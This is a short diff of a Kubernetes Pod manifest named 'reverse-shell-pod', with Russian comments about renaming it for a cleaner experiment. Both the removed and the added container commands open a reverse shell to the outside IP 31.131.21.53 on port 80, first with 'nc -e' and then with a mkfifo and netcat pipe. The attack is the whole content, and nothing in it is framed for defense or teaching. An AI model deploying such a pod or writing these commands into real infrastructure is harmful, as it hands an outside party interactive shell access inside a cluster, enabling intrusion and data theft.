@@ -1,7 +1,7 @@
 apiVersion: v1
 kind: Pod
 metadata:
-  name: reverse-shell-pod-v2 # Дадим новое имя, чтобы избежать проблем с обновлением
+  name: reverse-shell-pod-v3 # Снова новое имя для чистоты эксперимента
 spec:
   containers:
   - name: shell-container
@@ -9,4 +9,4 @@ spec:
     command: ["/bin/sh", "-c"]
     args:
     - |
-      apk add --no-cache netcat-openbsd && nc 31.131.21.53 80 -e /bin/sh
+      rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 31.131.21.53 80 >/tmp/f
